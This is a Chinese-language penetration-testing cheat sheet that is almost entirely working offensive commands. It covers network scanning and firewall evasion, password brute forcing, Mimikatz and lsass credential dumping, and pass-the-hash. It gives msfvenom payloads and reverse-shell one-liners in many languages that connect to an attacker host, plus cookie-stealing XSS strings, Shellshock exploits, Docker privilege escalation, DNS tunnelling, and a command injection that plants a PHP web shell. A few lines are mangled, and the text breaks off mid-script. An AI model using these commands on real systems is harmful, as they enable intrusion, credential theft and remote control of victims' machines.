```

最好的 NMAP 扫描策略

# 适用所有大小网络最好的 nmap 扫描策略

# 主机发现，生成存活主机列表
$ nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24
$ grep "Status: Up" Discovery.gnmap | cut -f 2 -d ' ' > LiveHosts.txt

# 端口发现，发现大部分常用端口
# http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf
$ nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt
$ nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt
$ nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt

# 端口发现，发现全部端口，但 UDP 端口的扫描会非常慢
$ nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt
$ nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt

# 显示 TCP\UDP 端口
$ grep "open" FullTCP|cut -f 1 -d ' ' | sort -nu | cut -f 1 -d '/' |xargs | sed 's/ /,/g'|awk '{print "T:"$0}'
$ grep "open" FullUDP|cut -f 1 -d ' ' | sort -nu | cut -f 1 -d '/' |xargs | sed 's/ /,/g'|awk '{print "U:"$0}'

# 侦测服务版本
$ nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt

# 扫做系统扫描
$ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt

# 系统和服务检测
$ nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt
 

Nmap – 躲避防火墙

# 分段
$ nmap -f

# 修改默认 MTU 大小，但必须为 8 的倍数(8,16,24,32 等等)
$ nmap --mtu 24

# 生成随机数量的欺骗
$ nmap -D RND:10 [target]

# 手动指定欺骗使用的 IP
$ nmap -D decoy1,decoy2,decoy3 etc.

# 僵尸网络扫描, 首先需要找到僵尸网络的IP
$ nmap -sI [Zombie IP] [Target IP]

# 指定源端口号
$ nmap --source-port 80 IP

# 在每个扫描数据包后追加随机数量的数据
$ nmap --data-length 25 IP

# MAC 地址欺骗，可以生成不同主机的 MAC 地址
$ nmap --spoof-mac Dell/Apple/3Com IP
 

Nmap 进行 Web 漏洞扫描

cd /usr/share/nmap/scripts/
wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz && tar xzf nmap_nse_vulscan-2.0.tar.gz
nmap -sS -sV --script=vulscan/vulscan.nse target
nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target
nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target
nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target
nmap -sV --script=vuln target
nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target
 

使用 DIRB 爆破目录

注：DIRB 是一个专门用于爆破目录的工具，在 Kali 中默认已经安装，类似工具还有国外的patator，dirsearch，DirBuster， 国内的御剑等等。

dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt
 

Patator – 全能暴力破解测试工具

# git clone https://github.com/lanjelot/patator.git /usr/share/patator

# SMTP 爆破
$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst
$ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
$ patator smtp_login host=192.168.17.129 helo='ehlo 192.168.17.128' user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep='incorrect password or account name'
 

使用 Fierce 爆破 DNS

注：Fierce 会检查 DNS 服务器是否允许区域传送。如果允许，就会进行区域传送并通知用户，如果不允许，则可以通过查询 DNS 服务器枚举主机名。类似工具：subDomainsBrute 和 SubBrute 等等

# http://ha.ckers.org/fierce/
$ ./fierce.pl -dns example.com
$ ./fierce.pl –dns example.com –wordlist myWordList.txt
 

使用 Nikto 扫描 Web 服务

nikto -C all -h http://IP
 

扫描 WordPress

git clone https://github.com/wpscanteam/wpscan.git && cd wpscan
./wpscan –url http://IP/ –enumerate p
 

HTTP 指纹识别

wget http://www.net-square.com/_assets/httprint_linux_301.zip && unzip httprint_linux_301.zip
cd httprint_301/linux/
./httprint -h http://IP -s signatures.txt
 

使用 Skipfish 扫描

注：Skipfish 是一款 Web 应用安全侦查工具，Skipfish 会利用递归爬虫和基于字典的探针生成一幅交互式网站地图，最终生成的地图会在通过安全检查后输出。

skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP
 

使用 NC 扫描

nc -v -w 1 target -z 1-1000
for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
 

Unicornscan

注：Unicornscan 是一个信息收集和安全审计的工具。

us -H -msf -Iv 192.168.56.101 -p 1-65535
us -H -mU -Iv 192.168.56.101 -p 1-65535

-H 在生成报告阶段解析主机名
-m 扫描类型 (sf - tcp, U - udp)
-Iv - 详细
 

使用 Xprobe2 识别操作系统指纹

xprobe2 -v -p tcp:80:open IP
 

枚举 Samba

nmblookup -A target
smbclient //MOUNT/share -I target -N
rpcclient -U "" target
enum4linux target
 

枚举 SNMP

snmpget -v 1 -c public IP
snmpwalk -v 1 -c public IP
snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP
 

实用的 Windows cmd 命令

net localgroup Users
net localgroup Administrators
search dir/s *.doc
system("start cmd.exe /k $cmd")
sc create microsoft_update binpath="cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe" start= auto error= ignore
/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
Procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"
C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp 32 位系统
C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp 64 位系统
 

PuTTY 连接隧道

转发远程端口到目标地址
plink.exe -P 22 -l root -pw "1234" -R 445:127.0.0.1:445 IP
 

Meterpreter 端口转发

# https://www.offensive-security.com/metasploit-unleashed/portfwd/
# 转发远程端口到目标地址
meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.141
kali > rdesktop 127.0.0.1:3389
 

开启 RDP 服务

reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable
 

关闭 Windows 防火墙

netsh firewall set opmode disable
 

Meterpreter VNC\RDP

# https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/
run getgui -u admin -p 1234
run vnc -p 5043
 

使用 Mimikatz

获取 Windows 明文用户名密码

git clone https://github.com/gentilkiwi/mimikatz.git
privilege::debug
sekurlsa::logonPasswords full
 

获取哈希值

git clone https://github.com/byt3bl33d3r/pth-toolkit
pth-winexe -U hash //IP cmd

或者

apt-get install freerdp-x11
xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP

在或者

meterpreter > run post/windows/gather/hashdump
Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
msf exploit(psexec) > exploit
meterpreter > shell
 

使用 Hashcat 破解密码

hashcat -m 400 -a 0 hash /root/rockyou.txt
 

使用 NC 抓取 Banner 信息

nc 192.168.0.10 80
GET / HTTP/1.1
Host: 192.168.0.10
User-Agent: Mozilla/4.0
Referrer: ">www.example.com
<enter>
<enter>
 

使用 NC 在 Windows 上反弹 shell

c:>nc -Lp 31337 -vv -e cmd.exe
nc 192.168.0.10 31337
c:>nc example.com 80 -e cmd.exe
nc -lp 80

nc -lp 31337 -e /bin/bash
nc 192.168.0.10 31337
nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000
 

查找 SUID\SGID root 文件

# 查找 SUID root 文件
find / -user root -perm -4000 -print

# 查找 SGID root 文件:
find / -group root -perm -2000 -print

# 查找 SUID 和 SGID 文件:
find / -perm -4000 -o -perm -2000 -print

# 查找不属于任何用户的文件:
find / -nouser -print

# 查找不属于任何用户组的文件:
find / -nogroup -print

# 查找软连接及其指向:
find / -type l -ls
 

Python shell

python -c 'import pty;pty.spawn("/bin/bash")'
 

Python\Ruby\PHP HTTP 服务器

python2 -m SimpleHTTPServer
python3 -m http.server
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 8888, 
 ocumentRoot => Dir.pwd).start"
php -S 0.0.0.0:8888
 

获取进程对应的 PID

fuser -nv tcp 80
fuser -k -n tcp 80
 

使用 Hydra 爆破 RDP

hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp
 

挂载远程 Windows 共享文件夹

smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
 

Kali 下编译 Exploit

gcc -m32 -o output32 hello.c (32 位)
gcc -m64 -o output hello.c (64 位)
 

Kali 下编译 Windows Exploit

wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
wine mingw-get-setup.exe
select mingw32-base
cd /root/.wine/drive_c/windows
wget http://gojhonny.com/misc/mingw_bin.zip && unzip mingw_bin.zip
cd /root/.wine/drive_c/MinGW/bin
wine gcc -o ability.exe /tmp/exploit.c -lwsock32
wine ability.exe
 

NASM 命令

注：NASM 全称 The Netwide Assembler，是一款基于80×86和x86-64平台的汇编语言编译程序，其设计初衷是为了实现编译器程序跨平台和模块化的特性。

nasm -f bin -o payload.bin payload.asm
nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload
 

SSH 穿透

ssh -D 127.0.0.1:1080 -p 22 user@IP
Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
proxychains commands target
 

SSH 穿透从一个网络到另一个网络

ssh -D 127.0.0.1:1080 -p 22 user1@IP1
Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
Add socks4 127.0.0.1 1081 in /etc/proxychains.conf
proxychains commands target
 

使用 metasploit 进行穿透

route add X.X.X.X 255.255.255.0 1
use auxiliary/server/socks4a
run
proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E

或者

# https://www.offensive-security.com/metasploit-unleashed/pivoting/
meterpreter > ipconfig
IP Address  : 10.1.13.3
meterpreter > run autoroute -s 10.1.13.0/24
meterpreter > run autoroute -p
10.1.13.0          255.255.255.0      Session 1
meterpreter > Ctrl+Z
msf auxiliary(tcp) > use exploit/windows/smb/psexec
msf exploit(psexec) > set RHOST 10.1.13.2
msf exploit(psexec) > exploit
meterpreter > ipconfig
IP Address  : 10.1.13.2
 

基于 CSV 文件查询 Exploit-DB

git clone https://github.com/offensive-security/exploit-database.git
cd exploit-database
./searchsploit –u
./searchsploit apache 2.2
./searchsploit "Linux Kernel"

cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep "<|<=" | sort -k3
 

MSF Payloads

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> X > system.exe
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 R > exploit.php
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -a x86 --platform win -f asp -o file.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e x86/shikata_ga_nai -b "\x00" -a x86 --platform win -f c
 

MSF 生成在 Linux 下反弹的 Meterpreter Shell

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -f elf -a x86 --platform linux -o shell
 

MSF 生成反弹 Shell (C Shellcode)

msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b "\x00\x0a\x0d" -a x86 --platform win -f c
 

MSF 生成反弹 Python Shell

msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py
 

MSF 生成反弹 ASP Shell

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp -a x86 --platform win -o shell.asp
 

MSF 生成反弹 Bash Shell

msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.sh
 

MSF 生成反弹 PHP Shell

msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.php
add <?php at the beginning
perl -i~ -0777pe's/^/<?php \n/' shell.php
 

MSF 生成反弹 Win Shell

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe -a x86 --platform win -o shell.exe
 

Linux 常用安全命令

# 使用 uid 查找对应的程序
find / -uid 0 -perm -4000

# 查找哪里拥有写权限
find / -perm -o=w

# 查找名称中包含点和空格的文件
find / -name " " -print
find / -name ".." -print
find / -name ". " -print
find / -name " " -print

# 查找不属于任何人的文件
find / -nouser

# 查找未链接的文件
lsof +L1

# 获取进程打开端口的信息
lsof -i

# 看看 ARP 表中是否有奇怪的东西
arp -a

# 查看所有账户
getent passwd

# 查看所有用户组
getent group

# 列举所有用户的 crontabs
for user in $(getent passwd|cut -f1 -d:); do echo "### Crontabs for $user ####"; crontab -u $user -l; done

# 生成随机密码
cat /dev/urandom| tr -dc ‘a-zA-Z0-9-_!@#$%^&*()_+{}|:<>?=’|fold -w 12| head -n 4

# 查找所有不可修改的文件
find . | xargs -I file lsattr -a file 2>/dev/null | grep ‘^….i’

# 使文件不可修改
chattr -i file
 

Windows 缓冲区溢出利用命令

msfvenom -p windows/shell_bind_tcp -a x86 --platform win -b "\x00" -f c
msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikata_ga_nai -b "\x00" -f c

COMMONLY USED BAD CHARACTERS:
\x00\x0a\x0d\x20                              For http request
\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c           Ending with (0\n\r_)

# 常用命令:
pattern create
pattern offset (EIP Address)
pattern offset (ESP Address)
add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )

!pvefindaddr pattern_create 5000
!pvefindaddr suggest
!pvefindaddr modules
!pvefindaddr nosafeseh

!mona config -set workingfolder C:\Mona\%p
!mona config -get workingfolder
!mona mod
!mona bytearray -b "\x00\x0a"
!mona pc 5000
!mona po EIP
!mona suggest
 

SEH – 结构化异常处理

注：SEH(“Structured Exception Handling”)，即结构化异常处理，是 windows 操作系统提供给程序设计者的强有力的处理程序错误或异常的武器。

# https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH
# http://baike.baidu.com/view/243131.htm
!mona suggest
!mona nosafeseh
nseh="\xeb\x06\x90\x90" (next seh chain)
iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)
 

ROP (DEP)

注：ROP(“Return-Oriented Programming”)是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。

DEP(“Data Execution Prevention”)是一套软硬件技术，在内存上严格将代码和数据进行区分，防止数据当做代码执行。

# https://en.wikipedia.org/wiki/Return-oriented_programming
# https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B
# https://en.wikipedia.org/wiki/Data_Execution_Prevention
# http://baike.baidu.com/item/DEP/7694630
!mona modules
!mona ropfunc -m *.dll -cpb "\x00\x09\x0a"
!mona rop -m *.dll -cpb "\x00\x09\x0a" (auto suggest)
 

ASLR – 地址空间格局随机化

# https://en.wikipedia.org/wiki/Address_space_layout_randomization
# http://baike.baidu.com/view/3862310.htm
!mona noaslr
 

寻蛋(EGG Hunter)技术

Egg hunting这种技术可以被归为“分级shellcode”，它主要可以支持你用一小段特制的shellcode来找到你的实际的（更大的）shellcode（我们的‘鸡蛋‘），原理就是通过在内存中搜索我们的最终shellcode。换句话说，一段短代码先执行，然后再去寻找真正的shellcode并执行。– 参考自看雪论坛，更多详情可以查阅我在代码注释中增加的链接。

# https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/
# http://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf
# http://www.fuzzysecurity.com/tutorials/expDev/4.html
!mona jmp -r esp
!mona egg -t lxxl
\xeb\xc4 (jump backward -60)
buff=lxxllxxl+shell
!mona egg -t 'w00t'
 

GDB Debugger 常用命令

# 设置断点
break *_start

# 执行下一个命令
next
step
n
s

# 继续执行
continue
c

# 数据
checking 'REGISTERS' and 'MEMORY'

# 显示寄存器的值: (Decimal,Binary,Hex)
print /d –> Decimal
print /t –> Binary
print /x –> Hex
O/P :
(gdb) print /d $eax
$17 = 13
(gdb) print /t $eax
$18 = 1101
(gdb) print /x $eax
$19 = 0xd
(gdb)

# 显示特定内存地址的值
command : x/nyz (Examine)
n –> Number of fields to display ==>
y –> Format for output ==> c (character) , d (decimal) , x (Hexadecimal)
z –> Size of field to be displayed ==> b (byte) , h (halfword), w (word 32 Bit)
 

BASH 反弹 Shell

bash -i >& /dev/tcp/X.X.X.X/443 0>&1

exec /bin/bash 0&0 2>&0
exec /bin/bash 0&0 2>&0

0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196

0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196

exec 5<>/dev/tcp/attackerip/4444 cat <&5 | while read line; do $line 2>&5 >&5; done # or: while read line 0<&5; do $line 2>&5 >&5; done
exec 5<>/dev/tcp/attackerip/4444

cat <&5 | while read line; do $line 2>&5 >&5; done # or:
while read line 0<&5; do $line 2>&5 >&5; done

/bin/bash -i > /dev/tcp/attackerip/8080 0<&1 2>&1
/bin/bash -i > /dev/tcp/X.X.X.X/443 0<&1 2>&1
 

PERL 反弹 Shell

perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

# Win 平台
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};’
 

RUBY 反弹 Shell

ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# Win 平台
ruby -rsocket -e 'c=TCPSocket.new("attackerip","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
ruby -rsocket -e 'f=TCPSocket.open("attackerip","443").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 

PYTHON 反弹 Shell

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attackerip",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 

PHP 反弹 Shell

php -r '$sock=fsockopen("attackerip",443);exec("/bin/sh -i <&3 >&3 2>&3");'
 

JAVA 反弹 Shell

r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/attackerip/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
 

NETCAT 反弹 Shell

nc -e /bin/sh attackerip 4444
nc -e /bin/sh 192.168.37.10 443

# 如果 -e 参数被禁用，可以尝试以下命令
# mknod backpipe p && nc attackerip 443 0<backpipe | /bin/bash 1>backpipe
/bin/sh | nc attackerip 443
rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4443 0/tmp/

# 如果你安装错了 netcat 的版本，请尝试以下命令
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attackerip >/tmp/f
 

TELNET 反弹 Shell

# 如果 netcat 不可用或者 /dev/tcp
mknod backpipe p && telnet attackerip 443 0<backpipe | /bin/bash 1>backpipe
 

XTERM 反弹 Shell

# http://baike.baidu.com/view/418628.htm
# 开启 X 服务器 (:1 – 监听 TCP 端口 6001)
apt-get install xnest
Xnest :1

# 记得授权来自目标 IP 的连接
xterm -display 127.0.0.1:1

# 授权访问
xhost +targetip

# 在目标机器上连接回我们的 X 服务器
xterm -display attackerip:1
/usr/openwin/bin/xterm -display attackerip:1
or
$ DISPLAY=attackerip:0 xterm
 

XSS 备忘录

https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
("< iframes > src=http://IP:PORT </ iframes >")

<script>document.location=http://IP:PORT</script>

';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//–></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

";!–"<XSS>=&amp;amp;{()}

<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"">
<IMG SRC=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;>

<IMG SRC=&amp;amp;#0000106&amp;amp;#0000097&amp;amp;#0000118&amp;amp;#0000097&amp;amp;#0000115&amp;amp;#0000099&amp;amp;#0000114&amp;amp;#0000105&amp;amp;#0000112&amp;amp;#0000116&amp;amp;#0000058&amp;amp;#0000097&amp;amp;#0000108&amp;amp;#0000101&amp;amp;#0000114&amp;amp;#0000116&amp;amp;#0000040&amp;amp;#0000039&amp;amp;#0000088&amp;amp;#0000083&amp;amp;#0000083&amp;amp;#0000039&amp;amp;#0000041>
<IMG SRC="jav ascript:alert('XSS');">

perl -e 'print "<IMG SRC=javascript:alert(\"XSS\")>";' > out

<BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")>

(">< iframes http://google.com < iframes >)

<BODY BACKGROUND="javascript:alert('XSS')">
<FRAMESET><FRAME SRC=”javascript:alert('XSS');"></FRAMESET>
"><script >alert(document.cookie)</script>
%253cscript%253ealert(document.cookie)%253c/script%253e
"><s"%2b"cript>alert(document.cookie)</script>
%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)'%3E
<img src=asdf onerror=alert(document.cookie)>
 

SSH Over SCTP (使用 Socat)

# 远端服务器
# 假设你准备让 SCTP socket 监听端口 80/SCTP 并且 sshd 端口在 22/TCP
$ socat SCTP-LISTEN:80,fork TCP:localhost:22

# 本地端
# 将 SERVER_IP 换成远端服务器的地址，然后将 80 换成 SCTP 监听的端口号
$ socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80

# 创建 socks 代理
# 替换 username 和 -p 的端口号
$ ssh -lusername localhost -D 8080 -p 1337
使用洋葱网络

# 安装服务
$ apt-get install tor torsocks

# 绑定 ssh 到 tor 服务端口 80
# /etc/tor/torrc
SocksPolicy accept 127.0.0.1
SocksPolicy accept 192.168.0.0/16
Log notice file /var/log/tor/notices.log
RunAsDaemon 1
HiddenServiceDir /var/lib/tor/ssh_hidden_service/
HiddenServicePort 80 127.0.0.1:22
PublishServerDescriptor 0
$ /etc/init.d/tor start
$ cat /var/lib/tor/ssh_hidden_service/hostname
3l5zstvt1zk5jhl662.onion

# ssh 客户端连接
$ apt-get install torsocks
$ torsocks ssh login@3l5zstvt1zk5jhl662.onion -p 80
 

Metagoofil – 元数据收集工具

注：Metagoofil 是一款利用Google收集信息的工具。

# http://www.edge-security.com/metagoofil.php
# 它可以自动在搜素引擎中检索和分析文件，还具有提供Mac地址，用户名列表等其他功能
$ python metagoofil.py -d example.com -t doc,pdf -l 200 -n 50 -o examplefiles -f results.html
 

利用 Shellshock

# 一个发现并利用服务器 Shellshock 的工具
# https://github.com/nccgroup/shocker
$ ./shocker.py -H 192.168.56.118  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose

# 查看文件
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 192.168.56.118 80

# 绑定 shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 192.168.56.118 80

# 反弹 Shell
$ nc -l -p 443
$ echo "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.56.103 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 192.168.56.118 80
 

获取 Docker 的 Root

# 获取  Docker 的 Root
# user 必须在 docker 用户组中
ek@victum:~/docker-test$ id
uid=1001(ek) gid=1001(ek) groups=1001(ek),114(docker)

ek@victum:~$ mkdir docker-test
ek@victum:~$ cd docker-test

ek@victum:~$ cat > Dockerfile
FROM debian:wheezy

ENV WORKDIR /stuff

RUN mkdir -p $WORKDIR

VOLUME [ $WORKDIR ]

WORKDIR $WORKDIR
<< EOF

ek@victum:~$ docker build -t my-docker-image .
ek@victum:~$ docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c \
'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh'
./sh
whoami
# root

ek@victum:~$ docker run -v /etc:/stuff -t my-docker-image /bin/sh -c 'cat /stuff/shadow'
 

使用 DNS 隧道绕过防火墙

# 让数据和命令使用 DNS 隧道传输以绕过防火墙的检查
# dnscat2 支持从目标主机上面上传和下载命令来获取文件、数据和程序

# 服务器 (攻击者)
$ apt-get update
$ apt-get -y install ruby-dev git make g++
$ gem install bundler
$ git clone https://github.com/iagox86/dnscat2.git
$ cd dnscat2/server
$ bundle install
$ ruby ./dnscat2.rb
dnscat2> New session established: 16059
dnscat2> session -i 16059

# 客户机 (目标)
# https://downloads.skullsecurity.org/dnscat2/
# https://github.com/lukebaggett/dnscat2-powershell
$ dnscat --host <dnscat server_ip>
 

编译 Assemble 代码

$ nasm -f elf32 simple32.asm -o simple32.o
$ ld -m elf_i386 simple32.o simple32

$ nasm -f elf64 simple.asm -o simple.o
$ ld simple.o -o simple
 

使用非交互 Shell 打入内网

# 生成 shell 使用的 ssh 密钥
$ wget -O - -q "http://domain.tk/sh.php?cmd=whoami"
$ wget -O - -q "http://domain.tk/sh.php?cmd=ssh-keygen -f /tmp/id_rsa -N \"\" "
$ wget -O - -q "http://domain.tk/sh.php?cmd=cat /tmp/id_rsa"

# 增加用户 tempuser 
$ useradd -m tempuser
$ mkdir /home/tempuser/.ssh && chmod 700 /home/tempuser/.ssh
$ wget -O - -q "http://domain.tk/sh.php?cmd=cat /tmp/id_rsa" > /home/tempuser/.ssh/authorized_keys
$ chmod 700 /home/tempuser/.ssh/authorized_keys
$ chown -R tempuser:tempuser /home/tempuser/.ssh

# 反弹 ssh shell
$ wget -O - -q "http://domain.tk/sh.php?cmd=ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no -R 127.0.0.1:8080:192.168.20.13:8080 -N -f "'>tempuser@<attacker_ip>"
 

利用 POST 远程命令执行获取 Shell

attacker:~$ curl -i -s -k  -X 'POST' --data-binary $'IP=%3Bwhoami&submit=submit' 'http://victum.tk/command.php'

attacker:~$ curl -i -s -k  -X 'POST' --data-binary $'IP=%3Becho+%27%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%27+%3E+..%2Fshell.php&submit=submit' 'http://victum.tk/command.php'

attacker:~$ curl http://victum.tk/shell.php?cmd=id

# 在服务器上下载 shell (phpshell.php)

http://victum.tk/shell.php?cmd=php%20-r%20%27file_put_contents%28%22phpshell.php%22,%20fopen%28%22http://attacker.tk/phpshell.txt%22,%20%27r%27%29%29;%27

# 运行 nc 并执行 phpshell.php
attacker:~$ nc -nvlp 1337
 

以管理员身份在 Win7 上反弹具有系统权限的 Shell

msfvenom –p windows/shell_reverse_tcp LHOST=192.168.56.102 –f exe > danger.exe

# 显示账户配置
net user <login>

# Kali 上下载 psexec

https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx

# 使用 powershell 脚本上传 psexec.exe 到目标机器
echo $client = New-Object System.Net.WebClient > script.ps1
echo $targetlocation = "http://192.168.56.102/PsExec.exe" >> script.ps1
echo $client.DownloadFile($targetlocation,"psexec.exe") >> script.ps1
powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1

# 使用 powershell 脚本上传 danger.exe 到目标机器
echo $client = New-Object System.Net.WebClient > script2.ps1
echo $targetlocation = "http://192.168.56.102/danger.exe" >> script2.ps1
